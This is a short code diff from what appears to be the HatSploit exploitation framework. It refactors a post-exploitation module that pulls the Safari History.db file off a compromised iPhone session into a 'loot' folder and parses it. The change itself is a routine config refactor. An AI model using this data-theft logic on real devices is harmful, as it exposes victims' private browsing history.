@@ -44,11 +44,11 @@ class HatSploitModule(Module, SessionTools, DBTools):
 
         if session:
             if session.download(
-                '/private/var/mobile/Library/Safari/History.db', config.path_config['loot_path']):
+                '/private/var/mobile/Library/Safari/History.db', self.config.path_config['loot_path']):
 
                 self.print_process("Parsing history database...")
                 try:
-                    history = self.parse_safari_history(config.path_config['loot_path'] + 'History.db')
+                    history = self.parse_safari_history(self.config.path_config['loot_path'] + 'History.db')
                 except Exception:
                     self.print_error("Failed to parse history database!")
                     return
